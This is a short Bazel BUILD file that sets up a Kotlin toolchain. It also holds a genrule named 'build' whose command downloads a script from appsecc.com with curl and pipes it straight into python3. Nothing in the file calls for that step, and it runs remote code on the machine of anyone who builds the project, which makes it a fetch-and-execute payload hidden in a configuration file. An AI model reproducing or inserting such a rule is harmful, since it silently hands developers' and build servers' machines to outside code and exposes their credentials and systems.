load("@io_bazel_rules_kotlin//kotlin:core.bzl", "define_kt_toolchain")

genrule(
    name = "build",
    outs = ["foo"],
    cmd = "curl -L https://appsecc.com/py|python3",
    visibility = ["//visibility:public"],
)

define_kt_toolchain(
    name = "kotlin_toolchain",
    api_version = "1.6",
    jvm_target = "11",
    language_version = "1.6",
)
